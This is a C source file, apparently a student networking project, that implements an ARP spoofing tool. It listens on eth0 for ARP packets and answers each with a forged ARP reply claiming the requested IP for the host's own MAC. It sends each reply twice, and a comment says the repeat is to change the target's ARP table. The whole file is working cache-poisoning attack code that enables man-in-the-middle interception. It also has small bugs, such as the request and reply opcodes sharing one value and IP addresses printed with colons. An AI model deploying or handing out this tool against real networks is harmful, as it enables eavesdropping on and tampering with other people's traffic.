#define _GNU_SOURCE /* To get defns of NI_MAXSERV and NI_MAXHOST */

#include <arpa/inet.h>
#include <ifaddrs.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <net/if.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define BUFFER_SIZE 1024
#define MAC_SIZE 6
#define IP_SIZE 4

struct hwaddr {
    uint16_t first;
    uint16_t second;
    uint16_t third;
} __attribute__((packed));

typedef struct arp_packet {
    uint16_t hwtype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t operation;
    struct hwaddr hwsender;
    uint32_t spa;
    struct hwaddr hwtarget;
    uint32_t tpa;
} __attribute__((packed)) t_arp_packet;

enum ft_error { FATAL, OK, NO_OK };

char *hwaddr_to_string(unsigned char *addr, char *str, size_t size) {
    if (addr == NULL || str == NULL || size < 18) return NULL;

    snprintf(str, size, "%02x:%02x:%02x:%02x:%02x:%02x", addr[0], addr[1],
             addr[2], addr[3], addr[4], addr[5]);

    return str;
}

char *raw_ip_to_str(unsigned char *raw_ip, char *str, size_t size) {
    snprintf(str, size, "%d:%d:%d:%d", raw_ip[0], raw_ip[1], raw_ip[2],
             raw_ip[3]);
    return str;
}

uint16_t reverse_endian_16(const uint16_t src) {
    uint16_t rev;
    unsigned char buff[2];
    buff[0] = ((unsigned char *)&src)[1];
    buff[1] = ((unsigned char *)&src)[0];
    memcpy(&rev, &buff, 2);
    return rev;
}

#define HW_TYPE_ETHER 1
#define P_TYPE_ARP 0x800
#define ARP_REPLY 2
#define ARP_REQUEST 2
t_arp_packet craft_arp_packet(const unsigned char source_mac_addr[MAC_SIZE],
                              const t_arp_packet intercepted_packet) {
    t_arp_packet packet = {0};
    packet.hwtype = reverse_endian_16(HW_TYPE_ETHER);
    packet.ptype = reverse_endian_16(P_TYPE_ARP);
    packet.hlen = MAC_SIZE;
    packet.plen = IP_SIZE;
    packet.operation = reverse_endian_16(ARP_REPLY);
    memcpy(&packet.hwsender, source_mac_addr, MAC_SIZE);
    memcpy(&packet.hwtarget, &intercepted_packet.hwsender,
           sizeof(struct hwaddr));
    memcpy(&packet.spa, &intercepted_packet.tpa, sizeof(packet.spa));
    memcpy(&packet.tpa, &intercepted_packet.spa, sizeof(packet.tpa));
    return packet;
}

enum ft_error get_mac_addr(unsigned char mac_addr[MAC_SIZE]) {
    struct ifaddrs *ifaddr;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return FATAL;
    }
    char found = 0;
    for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        int family = ifa->ifa_addr->sa_family;
        if (family != AF_PACKET) continue;

        if (strcmp(ifa->ifa_name, "eth0") != 0) continue;
        struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
        memcpy(mac_addr, s->sll_addr, 6);
        found = 1;
    }
    freeifaddrs(ifaddr);
    return found ? OK : FATAL;
}

void dump_packet(const t_arp_packet packet) {
    printf("\n***************************************\n");
    char str[18] = {0};
    char str2[18] = {0};
    printf("operation is %x: %s\n", packet.operation,
           packet.operation == reverse_endian_16(ARP_REQUEST) ? "REQUEST" : "REPLY");
    hwaddr_to_string((unsigned char *)&packet.hwsender, str, 18);
    printf("hwsender address %s\n", str);
    hwaddr_to_string((unsigned char *)&packet.hwtarget, str2, 18);
    printf("target address %s\n", str2);
    char str_ip1[16] = {0};
    char str_ip2[16] = {0};
    raw_ip_to_str((unsigned char *)&packet.spa, str_ip1, 16);
    raw_ip_to_str((unsigned char *)&packet.tpa, str_ip2, 16);
    printf("source ip addr %s\n", str_ip1);
    printf("target ip addr %s\n", str_ip2);
    printf("\n***************************************\n");
}

enum ft_error send_packet(const int sock_fd, const t_arp_packet packet) {
    unsigned int if_idx = if_nametoindex("eth0");
    printf("idx %d\n", if_idx);
    if (if_idx == 0) {
        perror("name to index: ");
        return NO_OK;
    }
    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETHERTYPE_ARP);
    addr.sll_ifindex = if_idx;
    addr.sll_halen = MAC_SIZE;
    memcpy(addr.sll_addr, &packet.hwtarget, sizeof(struct hwaddr));

    ssize_t bytes_sent =
        sendto(sock_fd, &packet, sizeof(t_arp_packet), MSG_CONFIRM,
               (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));
    if (bytes_sent == -1) {
        perror("Sendto :");
        return NO_OK;
    } else {
        printf("Sent packet of size %ld\n", sizeof(t_arp_packet));
    }
    return OK;
}

int main() {
    unsigned char mac_addr[6];
    if (get_mac_addr(mac_addr) != OK) {
        printf("Error getting host mac address\n");
        exit(1);
    }
    printf("My mac is : ");
    for (size_t i = 0; i < MAC_SIZE; i++) {
        printf("%x:", mac_addr[i]);
    }
    printf("\n");

    int sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETHERTYPE_ARP));
    if (sock == -1) {
        perror("creating socket :");
        exit(1);
    }

    while (1) {
        char buffer[BUFFER_SIZE] = {0};

        ssize_t bytes_recv = recvfrom(sock, buffer, BUFFER_SIZE, 0, NULL, NULL);
        if (bytes_recv == -1) {
            perror("Receiving message: ");
            close(sock);
            exit(1);
        }
        printf("Received msg of len %ld\n", bytes_recv);
        if (bytes_recv != sizeof(t_arp_packet)) {
            printf("Wrong size packet\n");
            // close(sock);
            // exit(1);
            continue;
        }

        t_arp_packet packet = {0};
        memcpy(&packet, buffer, bytes_recv);

        t_arp_packet crafted_packet = craft_arp_packet(mac_addr, packet);

        dump_packet(crafted_packet);
        dump_packet(packet);
        send_packet(sock, crafted_packet);
        // sometimes need to wait a bit to change the arp table of target
        sleep(5);
        send_packet(sock, crafted_packet);
    }
    return 0;
}
